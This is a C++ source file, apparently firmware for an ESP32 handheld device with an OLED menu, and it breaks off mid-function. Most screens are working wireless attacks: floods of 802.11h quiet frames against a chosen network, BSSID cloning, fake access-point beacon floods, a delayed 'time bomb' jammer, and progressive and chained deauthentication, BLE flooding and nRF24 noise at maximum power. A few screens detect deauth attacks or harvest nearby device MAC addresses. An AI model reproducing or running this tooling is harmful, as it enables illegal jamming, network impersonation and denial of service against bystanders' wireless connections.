static uint32_t gQuietStartMs = 0;
static inline void ggScreenQuietPick() {
  if (!gRunInit) { ggWifiPickScanBegin(); gRunInit=true; }
  if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
  if (!ggWifiPickScanPoll()) {
    ggOled.clearDisplay(); ggHeader("Quiet target");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning...");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggWifiAPCount==0) {
    ggOled.clearDisplay(); ggHeader("Quiet target");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No networks found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggWifiAPCount-1);
  if (gEv.sel) {
    gWifiTx.channel = ggWifiAPs[gSel].channel;
    memcpy(ggWifiDeauthBssid, ggWifiAPs[gSel].bssid, 6);
    ggWifiPickScanEnd();
    ggClickFire();
    ggBack(); ggGo(GS_QUIET_RUN);
    return;
  }
  static char rows[GG_WIFI_SCAN_MAX][22]; const char* p[GG_WIFI_SCAN_MAX];
  for (int i=0;i<ggWifiAPCount;i++){ snprintf(rows[i],22,"%.8s %ddB CH%u",ggWifiAPs[i].ssid,ggWifiAPs[i].rssi,ggWifiAPs[i].channel); p[i]=rows[i]; }
  ggMenu("Quiet target", p, ggWifiAPCount, gSel, gTop, "SEL=silence clients");
}

static inline void ggScreenQuietRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    ggWifiQuietMode = true;
    ggQuietCount = 0;
    gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    ggWifiTxBegin(gWifiTx);
    gQuietStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) { ggWifiTxEnd(); ggBack(); return; }
  uint32_t cnt = ggQuietCount;
  uint32_t elapsed = (millis()-gQuietStartMs)/1000;
  uint32_t pps = elapsed > 0 ? cnt / elapsed : 0;
  gPhase = cnt/100;
  ggOled.clearDisplay(); ggHeader("QUIET STORM");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH%u 802.11h", gWifiTx.channel);
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(cnt)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.printf("%lu quiet/s  %lus",(unsigned long)pps,(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- BSSID CLONE (pick + run)
static uint32_t gCloneStartMs = 0;
static inline void ggScreenClonePick() {
  if (!gRunInit) { ggWifiPickScanBegin(); gRunInit=true; }
  if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
  if (!ggWifiPickScanPoll()) {
    ggOled.clearDisplay(); ggHeader("Clone target");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("Scanning...");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
    ggOled.display(); return;
  }
  if (ggWifiAPCount==0) {
    ggOled.clearDisplay(); ggHeader("Clone target");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setCursor(2,25); ggOled.print("No networks found");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=go back");
    ggOled.display(); return;
  }
  ggMove(0, ggWifiAPCount-1);
  if (gEv.sel) {
    gWifiTx.channel = ggWifiAPs[gSel].channel;
    memcpy(ggCloneBssid, ggWifiAPs[gSel].bssid, 6);
    strncpy(ggCloneSsid, ggWifiAPs[gSel].ssid, 32); ggCloneSsid[32] = '\0';
    ggCloneEnc = ggWifiAPs[gSel].enc;
    ggWifiPickScanEnd();
    ggClickFire();
    ggBack(); ggGo(GS_CLONE_RUN);
    return;
  }
  static char rows[GG_WIFI_SCAN_MAX][22]; const char* p[GG_WIFI_SCAN_MAX];
  for (int i=0;i<ggWifiAPCount;i++){ snprintf(rows[i],22,"%.8s %ddB CH%u",ggWifiAPs[i].ssid,ggWifiAPs[i].rssi,ggWifiAPs[i].channel); p[i]=rows[i]; }
  ggMenu("Clone target", p, ggWifiAPCount, gSel, gTop, "SEL=clone this BSSID");
}

static inline void ggScreenCloneRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    ggWifiCloneMode = true;
    ggCloneCount = 0;
    gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    ggWifiTxBegin(gWifiTx);
    gCloneStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) { ggWifiTxEnd(); ggBack(); return; }
  uint32_t cnt = ggCloneCount;
  uint32_t elapsed = (millis()-gCloneStartMs)/1000;
  uint32_t pps = elapsed > 0 ? cnt / elapsed : 0;
  gPhase = cnt/50;
  ggOled.clearDisplay(); ggHeader("BSSID CLONE");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  char cs[16]; snprintf(cs,16,"%.12s",ggCloneSsid);
  ggOled.setCursor(34,18); ggOled.print(cs);
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(cnt)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.printf("%lu clone/s  %lus",(unsigned long)pps,(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- FAKE AP FARM
static uint32_t gFarmStartMs = 0;
static inline void ggScreenFarmRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    ggWifiFarmMode = true;
    ggFarmCount = 0;
    gWifiTx.channel = 1; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    ggWifiTxBegin(gWifiTx);
    gFarmStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) { ggWifiTxEnd(); ggBack(); return; }
  if (gEv.up)   { int v=(int)gWifiTx.channel+1; if(v>14)v=1;  gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); }
  if (gEv.down) { int v=(int)gWifiTx.channel-1; if(v<1)v=14; gWifiTx.channel=(uint8_t)v; ggWifiTxSetChannel(gWifiTx.channel, gWifiTx); }
  uint32_t cnt = ggFarmCount;
  uint32_t elapsed = (millis()-gFarmStartMs)/1000;
  uint32_t pps = elapsed > 0 ? cnt / elapsed : 0;
  gPhase = cnt/50;
  ggOled.clearDisplay(); ggHeader("AP FARM");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH%u %u SSIDs", gWifiTx.channel, GG_FARM_N);
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(cnt)); ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.printf("%lu beac/s  %lus",(unsigned long)pps,(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop  UP/DN ch");
  ggOled.display();
}

// ---------------------------------------------------------------- WIFI TIME BOMB
static inline void ggScreenTimeBomb() {
  if (!gTimeBombArmed) {
    if (gEv.back) { ggBack(); return; }
    if (gEv.up)   { int v=(int)gTimeBombDelay+10; if(v>300)v=300; gTimeBombDelay=(uint16_t)v; }
    if (gEv.down) { int v=(int)gTimeBombDelay-10; if(v<10)v=10; gTimeBombDelay=(uint16_t)v; }
    if (gEv.sel)  { gTimeBombArmed=true; gTimeBombStartMs=millis(); ggClickFire(); }
    ggOled.clearDisplay(); ggHeader("TIME BOMB");
    ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
    ggOled.setCursor(2,18); ggOled.printf("Delay: %u sec", gTimeBombDelay);
    ggOled.setCursor(2,28); ggOled.print("Starts Full Jam");
    ggOled.setCursor(2,38); ggOled.print("after countdown");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("SEL=arm  UP/DN delay");
  } else {
    uint32_t elapsed = (millis()-gTimeBombStartMs)/1000;
    if (elapsed >= gTimeBombDelay) {
      gTimeBombArmed = false;
      gJamCh = 1;
      ggBack(); ggGo(GS_JAM_RUN);
      return;
    }
    if (gEv.back) { gTimeBombArmed=false; ggBack(); return; }
    uint32_t left = gTimeBombDelay - elapsed;
    ggOled.clearDisplay(); ggHeader("TIME BOMB");
    ggOled.setTextColor(SSD1306_WHITE);
    ggOled.setTextSize(2); ggOled.setCursor(34,25); ggOled.printf("%lus",(unsigned long)left);
    ggOled.setTextSize(1);
    ggOled.setCursor(2,45); ggOled.print("Jam starts when 0");
    ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
    ggOled.setCursor(2,56); ggOled.print("BACK=disarm");
  }
  ggOled.display();
}

// ---------------------------------------------------------------- DEAUTH DETECT
static uint8_t gDeauthDetCh = 1;
static uint32_t gDeauthDetChLast = 0;
static inline void ggScreenDeauthDet() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    ggDeauthDetectBegin();
    gDeauthDetCh = 1;
    esp_wifi_set_channel(gDeauthDetCh, WIFI_SECOND_CHAN_NONE);
    gDeauthDetChLast = millis();
    gRunInit = true;
  }
  if (gEv.back) { ggDeauthDetectEnd(); ggBack(); return; }
  if (gEv.sel) { ggDeauthDetectCnt = 0; }
  uint32_t now = millis();
  if (now - gDeauthDetChLast >= 400) {
    gDeauthDetCh++; if (gDeauthDetCh > 14) gDeauthDetCh = 1;
    esp_wifi_set_channel(gDeauthDetCh, WIFI_SECOND_CHAN_NONE);
    gDeauthDetChLast = now;
  }
  uint32_t daCnt = ggDeauthDetectCnt;
  uint32_t daMs  = ggDeauthLastMs;
  uint8_t  daBss[6]; memcpy(daBss, ggDeauthLastBssid, 6);
  bool recent = (daMs > 0 && now - daMs < 3000);
  ggOled.clearDisplay(); ggHeader("DEAUTH DET");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("CH%u  scanning...", gDeauthDetCh);
  ggOled.setCursor(2,28);
  if (daCnt > 0) {
    ggOled.setTextSize(2); ggOled.printf("%lu!", (unsigned long)daCnt); ggOled.setTextSize(1);
  } else {
    ggOled.setTextSize(2); ggOled.print("0 clear"); ggOled.setTextSize(1);
  }
  if (recent) {
    ggOled.setCursor(2,45); ggOled.printf("%02X:%02X:%02X:%02X:%02X:%02X",
      daBss[0],daBss[1],daBss[2],daBss[3],daBss[4],daBss[5]);
    ggBeep(2800,40);
  } else {
    ggOled.setCursor(2,45); ggOled.print("Monitoring...");
  }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop  SEL=reset");
  ggOled.display();
}

// ---------------------------------------------------------------- WIFI GEOFENCE (pick + watch)
static bool gGeoScanning = true;
static inline void ggScreenGeofence() {
  if (gGeoScanning) {
    if (!gRunInit) { if (ggTrkBleReady) ggTrkScanEnd(); if (ggCopRunning) ggCopScanEnd(); ggWifiPickScanBegin(); gRunInit = true; }
    if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
    if (!ggWifiPickScanPoll()) {
      ggOled.clearDisplay(); ggHeader("Geofence trgt");
      ggOled.setTextColor(SSD1306_WHITE);
      ggOled.setCursor(2,25); ggOled.print("Scanning...");
      ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
      ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
      ggOled.display(); return;
    }
    if (ggWifiAPCount==0) {
      ggOled.clearDisplay(); ggHeader("Geofence trgt");
      ggOled.setTextColor(SSD1306_WHITE);
      ggOled.setCursor(2,25); ggOled.print("No networks found");
      ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
      ggOled.setCursor(2,56); ggOled.print("BACK=go back");
      ggOled.display(); return;
    }
    ggMove(0, ggWifiAPCount-1);
    if (gEv.sel) {
      strncpy(gGeofenceSsid, ggWifiAPs[gSel].ssid, 32); gGeofenceSsid[32] = '\0';
      gGeofenceCh = ggWifiAPs[gSel].channel;
      ggWifiPickScanEnd();
      ggClickFire();
      gGeoScanning = false;
      gGeofenceFound = false;
      gGeofenceLastScan = 0;
      return;
    }
    static char rows[GG_WIFI_SCAN_MAX][22]; const char* p[GG_WIFI_SCAN_MAX];
    for (int i=0;i<ggWifiAPCount;i++){ snprintf(rows[i],22,"%.8s %ddB CH%u",ggWifiAPs[i].ssid,ggWifiAPs[i].rssi,ggWifiAPs[i].channel); p[i]=rows[i]; }
    ggMenu("Geofence trgt", p, ggWifiAPCount, gSel, gTop, "SEL=watch this SSID");
    return;
  }
  if (gEv.back) { WiFi.scanDelete(); WiFi.mode(WIFI_OFF); gGeoScanning = true; ggBack(); return; }
  uint32_t now = millis();
  if (now - gGeofenceLastScan >= 5000) {
    gGeofenceLastScan = now;
    WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(20);
    { wifi_country_t cty={"XX",1,14,78,WIFI_COUNTRY_POLICY_MANUAL}; esp_wifi_set_country(&cty); }
    WiFi.scanNetworks(true, true);
  }
  int n = WiFi.scanComplete();
  if (n >= 0) {
    gGeofenceFound = false;
    for (int i = 0; i < n; i++) {
      if (strcmp(WiFi.SSID(i).c_str(), gGeofenceSsid) == 0) { gGeofenceFound = true; break; }
    }
    WiFi.scanDelete();
  }
  ggOled.clearDisplay(); ggHeader("GEOFENCE");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  char gs[22]; snprintf(gs,22,"\"%.18s\"",gGeofenceSsid);
  ggOled.setCursor(2,18); ggOled.print(gs);
  ggOled.setCursor(2,28);
  if (gGeofenceFound) {
    ggOled.setTextSize(2); ggOled.print("FOUND!"); ggOled.setTextSize(1);
    { static uint32_t gGeoBeepLast=0; uint32_t _n=millis(); if(_n-gGeoBeepLast>2000){ ggBeep(2500,60); ggBeep(3000,90); gGeoBeepLast=_n; } }
  } else {
    ggOled.setTextSize(2); ggOled.print("scanning"); ggOled.setTextSize(1);
  }
  ggOled.setCursor(2,45); ggOled.printf("CH%u  every 5s", gGeofenceCh);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- MAC HARVEST
static inline void ggScreenMacHarvest() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    ggBlePickScanBegin();
    gRunInit = true;
  }
  if (gEv.back) { ggBlePickScanEnd(); ggBack(); return; }
  if (ggBlePickScanPoll()) ggBlePickScanRestart();
  int n = ggMacCount;
  if (n > 0) ggMove(0, n-1);
  ggOled.clearDisplay(); ggHeader("MAC HARVEST");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("Unique MACs: %d", n);
  if (n > 0) {
    int top = 0;
    if (gSel > top + 2) top = gSel - 2;
    for (int i = 0; i < 3 && top + i < n; i++) {
      int idx = top + i;
      int y = 28 + i * 9;
      if (idx == gSel) {
        ggOled.fillRect(0, y-1, 128, 9, SSD1306_WHITE);
        ggOled.setTextColor(SSD1306_BLACK);
      } else ggOled.setTextColor(SSD1306_WHITE);
      ggOled.setCursor(2, y);
      ggOled.printf("%02X:%02X:%02X %ddB",
        ggMacList[idx][0],ggMacList[idx][1],ggMacList[idx][2],ggMacRssi[idx]);
    }
    ggOled.setTextColor(SSD1306_WHITE);
  } else {
    ggOled.setCursor(2, 35); ggOled.print("Scanning BLE...");
  }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- BLE PROXIMITY ALERT
static int8_t gProxThreshold = -40;
static bool   gProxAlerted = false;
static inline void ggScreenProxAlert() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    gProxAlerted = false;
    ggBlePickScanBegin();
    gRunInit = true;
  }
  if (gEv.back) { ggBlePickScanEnd(); ggBack(); return; }
  if (gEv.up)   { int v=gProxThreshold+5; if(v>-10)v=-10; gProxThreshold=(int8_t)v; }
  if (gEv.down) { int v=gProxThreshold-5; if(v<-90)v=-90; gProxThreshold=(int8_t)v; }
  if (ggBlePickScanPoll()) ggBlePickScanRestart();
  int8_t strongest = -127;
  int bestIdx = -1;
  for (int i = 0; i < ggBlePickDevCount; i++) {
    if (ggBlePickDevs[i].rssi > strongest) { strongest = ggBlePickDevs[i].rssi; bestIdx = i; }
  }
  bool alert = (strongest >= gProxThreshold && bestIdx >= 0);
  if (alert && !gProxAlerted) { ggBeep(2800,80); ggBeep(3200,120); gProxAlerted = true; }
  if (!alert) gProxAlerted = false;
  ggOled.clearDisplay(); ggHeader("PROX ALERT");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("Thresh: %ddBm  N:%d", gProxThreshold, ggBlePickDevCount);
  if (bestIdx >= 0) {
    ggOled.setCursor(2,28);
    if (alert) {
      ggOled.setTextSize(2); ggOled.print("CLOSE!"); ggOled.setTextSize(1);
    } else {
      ggOled.print("Nearest:");
    }
    ggOled.setCursor(2,45); ggOled.printf("%.12s %ddB", ggBlePickDevs[bestIdx].name, strongest);
  } else {
    ggOled.setCursor(2,35); ggOled.print("Scanning BLE...");
  }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK  UP/DN thresh");
  ggOled.display();
}

// ---------------------------------------------------------------- UUID SCANNER
static inline void ggScreenUuidScan() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    ggBlePickScanBegin();
    gRunInit = true;
  }
  if (gEv.back) { ggBlePickScanEnd(); ggBack(); return; }
  if (ggBlePickScanPoll()) ggBlePickScanRestart();
  int n = ggBlePickDevCount;
  if (n > 0) ggMove(0, n-1);
  ggOled.clearDisplay(); ggHeader("UUID SCAN");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("Devices: %d", n);
  if (n > 0) {
    int top = 0;
    if (gSel > top + 2) top = gSel - 2;
    for (int i = 0; i < 3 && top + i < n; i++) {
      int idx = top + i;
      int y = 28 + i * 9;
      if (idx == gSel) {
        ggOled.fillRect(0, y-1, 128, 9, SSD1306_WHITE);
        ggOled.setTextColor(SSD1306_BLACK);
      } else ggOled.setTextColor(SSD1306_WHITE);
      ggOled.setCursor(2, y);
      if (ggBlePickDevs[idx].uuid16)
        ggOled.printf("%.7s %04X", ggBlePickDevs[idx].name, ggBlePickDevs[idx].uuid16);
      else
        ggOled.printf("%.12s", ggBlePickDevs[idx].name);
    }
    ggOled.setTextColor(SSD1306_WHITE);
  } else {
    ggOled.setCursor(2, 35); ggOled.print("Scanning BLE...");
  }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- BLE RANGE TEST
static inline void ggScreenBleRange() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning) ggCopScanEnd();
    ggBlePickScanBegin();
    gRunInit = true;
  }
  if (gEv.back) { ggBlePickScanEnd(); ggBack(); return; }
  if (ggBlePickScanPoll()) ggBlePickScanRestart();
  int8_t strongest = -127;
  int bestIdx = -1;
  for (int i = 0; i < ggBlePickDevCount; i++) {
    if (ggBlePickDevs[i].rssi > strongest) { strongest = ggBlePickDevs[i].rssi; bestIdx = i; }
  }
  ggOled.clearDisplay(); ggHeader("BLE RANGE");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  if (bestIdx >= 0) {
    ggOled.setCursor(2,18); ggOled.printf("%.10s N:%d", ggBlePickDevs[bestIdx].name, ggBlePickDevCount);
    ggOled.setTextSize(2); ggOled.setCursor(2,28); ggOled.printf("%ddBm", strongest); ggOled.setTextSize(1);
    int barW = (strongest + 100);
    if (barW < 0) barW = 0; if (barW > 100) barW = 100;
    ggOled.fillRect(2, 44, barW, 6, SSD1306_WHITE);
    ggOled.drawRect(2, 44, 100, 6, SSD1306_WHITE);
  } else {
    ggOled.setCursor(2,28); ggOled.print("Scanning BLE...");
  }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop");
  ggOled.display();
}

// ---------------------------------------------------------------- PROGRESSIVE JAM
static uint32_t gProgStartMs = 0;
static inline void ggScreenProgJam() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gProgPwr = 0;
    gWifiTx.channel = 1; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_LOW;
    memset(ggWifiDeauthBssid, 0xFF, 6);
    ggWifiDeauthMode = true;
    ggWifiTxBegin(gWifiTx);
    gProgWifiUp = true;
    gBleTx.pps = 500; gBleTx.power = GG_BP_LOW; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
    ggBleFloodMode = true;
    ggBleTxBegin(gBleTx);
    gProgBleUp = true;
    ggFloodNrfChLo = 0; ggFloodNrfChHi = 125;
    ggFloodNrfPosA = 0; ggFloodNrfPosB = 63;
    if (ggNrfPresentA) { ggNrfNoiseBegin(ggNrfA, 0);  ggNrfA.setPALevel(RF24_PA_MIN); }
    if (ggNrfPresentB) { ggNrfNoiseBegin(ggNrfB, 63); ggNrfB.setPALevel(RF24_PA_MIN); }
    ggFloodNrfActive = true;
    gProgStartMs = millis(); gProgLastRamp = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    if (gProgWifiUp) { ggWifiTxEnd(); gProgWifiUp = false; }
    if (gProgBleUp)  { ggBleFloodMode = false; ggBleTxEnd(); gProgBleUp = false; }
    ggWifiDeauthMode = false;
    ggBack(); return;
  }
  ggFloodNrfPump();
  if (ggBleFloodMode) ggBleFloodCycle();
  uint32_t now = millis();
  if (now - gProgLastRamp >= 5000 && gProgPwr < 3) {
    gProgLastRamp = now;
    gProgPwr++;
    int8_t txp;
    switch (gProgPwr) {
      case 1: txp = 44; break;
      case 2: txp = 68; break;
      default: txp = 78; break;
    }
    esp_wifi_set_max_tx_power(txp);
    esp_power_level_t bpwr;
    switch (gProgPwr) {
      case 1: bpwr = ESP_PWR_LVL_N0; break;
      case 2: bpwr = ESP_PWR_LVL_P6; break;
      default: bpwr = ESP_PWR_LVL_P9; break;
    }
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, bpwr);
    uint8_t nrfPa;
    switch (gProgPwr) {
      case 1: nrfPa = RF24_PA_LOW;  break;
      case 2: nrfPa = RF24_PA_HIGH; break;
      default: nrfPa = RF24_PA_MAX; break;
    }
    if (ggNrfPresentA) ggNrfA.setPALevel(nrfPa);
    if (ggNrfPresentB) ggNrfB.setPALevel(nrfPa);
  }
  static uint32_t lastProgHop = 0;
  if (now - lastProgHop >= 60) {
    lastProgHop = now;
    static uint8_t progCh = 1;
    progCh++; if (progCh > 14) progCh = 1;
    gWifiTx.channel = progCh;
    ggWifiTxSetChannel(progCh, gWifiTx);
  }
  uint32_t elapsed = (millis()-gProgStartMs)/1000;
  uint32_t wPkt = ggWifiPktCnt;
  uint32_t bPkt = ggBlePktEst();
  gPhase = (wPkt+bPkt)/100;
  ggOled.clearDisplay(); ggHeader("PROG JAM");
  ggBurstMark(14, 32, (int)(gPhase%1000));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("PWR %s", GG_WP_NAME[gProgPwr]);
  ggOled.setTextSize(2); ggOled.setCursor(34,28);
  ggOled.print(ggFmtCount(wPkt+bPkt));
  ggOled.setTextSize(1);
  { char wf[10],bf[10]; strncpy(wf,ggFmtCount(wPkt),9); wf[9]=0; strncpy(bf,ggFmtCount(bPkt),9); bf[9]=0; ggOled.setCursor(2,45); ggOled.printf("W:%s B:%s %lus",wf,bf,(unsigned long)elapsed); }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop  ramps up");
  ggOled.display();
}

// ---------------------------------------------------------------- CHAIN ATTACK (WiFi>BLE>nRF cycle)
static uint32_t gChainStartMs = 0;
static inline void ggScreenChainRun() {
  if (!gRunInit) {
    if (ggTrkBleReady) ggTrkScanEnd();
    if (ggCopRunning)  ggCopScanEnd();
    gChainPhase = 0;
    gWifiTx.channel = 1; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
    memset(ggWifiDeauthBssid, 0xFF, 6);
    ggWifiDeauthMode = true;
    ggWifiTxBegin(gWifiTx);
    gChainWifiUp = true; gChainBleUp = false;
    gChainPhaseMs = millis();
    gChainStartMs = millis(); gPhase = 0; gRunInit = true;
  }
  if (gEv.back) {
    ggFloodNrfStop();
    if (gChainWifiUp) { ggWifiTxEnd(); gChainWifiUp = false; }
    if (gChainBleUp)  { ggBleFloodMode = false; ggBleTxEnd(); gChainBleUp = false; }
    ggWifiDeauthMode = false;
    ggBack(); return;
  }
  uint32_t now = millis();
  if (now - gChainPhaseMs >= 10000) {
    gChainPhaseMs = now;
    gChainPhase = (gChainPhase + 1) % 3;
    if (gChainPhase == 0) {
      ggFloodNrfStop();
      gWifiTx.channel = 1; gWifiTx.pps = 1000; gWifiTx.power = GG_WP_MAX;
      memset(ggWifiDeauthBssid, 0xFF, 6);
      ggWifiDeauthMode = true;
      ggWifiTxBegin(gWifiTx);
      gChainWifiUp = true;
    } else if (gChainPhase == 1) {
      if (gChainWifiUp) { ggWifiTxEnd(); gChainWifiUp = false; }
      ggWifiDeauthMode = false;
      gBleTx.pps = 500; gBleTx.power = GG_BP_MAX; gBleTx.channels = GG_BC_ALL; gBleTx.durationSec = 0;
      ggBleFloodMode = true;
      ggBleTxBegin(gBleTx);
      gChainBleUp = true;
    } else {
      if (gChainBleUp) { ggBleFloodMode = false; ggBleTxEnd(); gChainBleUp = false; }
      ggFloodNrfChLo = 0; ggFloodNrfChHi = 125;
      ggFloodNrfPosA = 0; ggFloodNrfPosB = 63;
      if (ggNrfPresentA) ggNrfNoiseBegin(ggNrfA, 0);
      if (ggNrfPresentB) ggNrfNoiseBegin(ggNrfB, 63);
      ggFloodNrfActive = true;
    }
  }
  if (gChainPhase == 1 && ggBleFloodMode) ggBleFloodCycle();
  if (gChainPhase == 2) ggFloodNrfPump();
  if (gChainPhase == 0) {
    static uint32_t lastChHop = 0;
    if (now - lastChHop >= 60) { lastChHop = now; static uint8_t chC=1; chC++; if(chC>14)chC=1; gWifiTx.channel=chC; ggWifiTxSetChannel(chC, gWifiTx); }
  }
  uint32_t elapsed = (millis()-gChainStartMs)/1000;
  uint32_t elPh = (now - gChainPhaseMs)/1000;
  uint32_t left = (elPh < 10) ? (10 - elPh) : 0;
  const char* ph[] = {"WiFi","BLE","nRF"};
  ggOled.clearDisplay(); ggHeader("CHAIN ATK");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("Phase: %s  %lus",ph[gChainPhase],(unsigned long)left);
  ggOled.setTextSize(2); ggOled.setCursor(2,28); ggOled.print(ph[gChainPhase]); ggOled.setTextSize(1);
  ggOled.setCursor(2,45); ggOled.printf("Total: %lus  MAX PWR",(unsigned long)elapsed);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("BACK=stop  auto-cycle");
  ggOled.display();
}

// ---------------------------------------------------------------- AUTO-TARGET
static uint32_t gAutoStartMs = 0;
static bool     gAutoWifiUp = false, gAutoBleUp = false;
static bool     gAutoScanning = true;
static inline void ggScreenAutoTarget() {
  if (!gRunInit) {
    gAutoScanning = true;
    ggWifiPickScanBegin();
    gRunInit = true;
  }
  if (gAutoScanning) {
    if (gEv.back) { ggWifiPickScanEnd(); ggBack(); return; }
    if (!ggWifiPickScanPoll()) {
      ggOled.clearDisplay(); ggHeader("AUTO TARGET");
      ggOled.setTextColor(SSD1306_WHITE);
      ggOled.setCursor(2,25); ggOled.print("Scanning for target");
      ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
      ggOled.setCursor(2,56); ggOled.print("BACK=cancel");
      ggOled.display(); return;
    }
    if (ggWifiAPCount == 0) {
      ggOled.clearDisplay(); ggHeader("AUTO TARGET");
      ggOled.setTextColor(SSD1306_WHITE);
      ggOled.setCursor(2,25); ggOled.print("No networks found");
      ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
      ggOled.setCursor(2,56); ggOled.print("BACK=go back");
      ggOled.display(); return;
    }
    int best = 0;
